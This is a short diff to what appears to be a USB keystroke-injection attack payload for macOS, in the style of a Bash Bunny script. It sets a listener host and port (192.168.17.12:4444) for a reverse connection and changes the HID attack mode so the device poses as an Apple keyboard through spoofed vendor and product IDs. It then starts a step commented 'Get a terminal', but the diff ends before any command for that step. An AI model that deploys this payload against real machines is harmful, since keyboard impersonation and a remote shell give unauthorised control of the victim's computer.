@@ -4,14 +4,10 @@ DYLD_ROOT=true
 LHOST=192.168.17.12
 LPORT=4444
 
-#daddy want a MacBook keyboard, or momma mac be mad, go boom boom.
-VID 05ac
-PID 2227
 LANGUAGE='us'
 
-
 # Gimme a Keyboard please. Thanks.
-ATTACKMODE HID
+ATTACKMODE HID VID_0X05AC PID_0X021E
 LED R G B
 
 # Get a terminal
